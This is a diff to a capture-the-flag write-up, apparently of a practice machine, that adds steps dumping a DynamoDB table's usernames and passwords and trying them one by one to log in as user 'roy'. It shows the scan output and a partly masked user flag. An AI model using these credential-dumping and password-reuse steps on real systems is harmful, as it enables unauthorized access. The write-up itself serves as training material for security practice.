@@ -281,9 +281,9 @@ Aws is using a `DynamoDB` database!
 
 <br />
 
-This database is hosted on `localhost:4566`, but is in the same aws `server` as the bucket, so we can enumerate it from our machine, with `aws` and using the same endpoint.
+This database is hosted on `localhost:4566`, but since it's running on the same `AWS` service as the bucket, we can enumerate it from our attacking machine using the same `endpoint`.
 
-We start listing the avaialable `tables`:
+We start listing the available `tables`:
 
 <br />
 
@@ -298,4 +298,64 @@ We start listing the avaialable `tables`:
 
 <br />
 
+There is only one.
+
+Using the `scan` option, we can `dump` its content:
+
+<br />
+
+```bash
+{
+    "Items": [
+        {
+            "password": {
+                "S": "Management@#1@#"
+            },
+            "username": {
+                "S": "Mgmt"
+            }
+        },
+        {
+            "password": {
+                "S": "Welcome123!"
+            },
+            "username": {
+                "S": "Cloudadm"
+            }
+        },
+        {
+            "password": {
+                "S": "n2vM-<_K_Q:.Aa2"
+            },
+            "username": {
+                "S": "Sysadm"
+            }
+        }
+    ],
+    "Count": 3,
+    "ScannedCount": 3,
+    "ConsumedCapacity": null
+}
+```
+
+<br />
+
+Nice! We found several `passwords`.
+
+Trying one by one, we finally get a good one that works to `roy` user:
+
+<br />
+
+```bash
+roy@bucket:~$ id
+uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
+roy@bucket:~$ cat user.txt
+0ac4bcc7594c64dd4822867183xxxxxx
+```
+
+<br />
+
+# Privilege Escalation: roy -> root 
+
+<br />
 
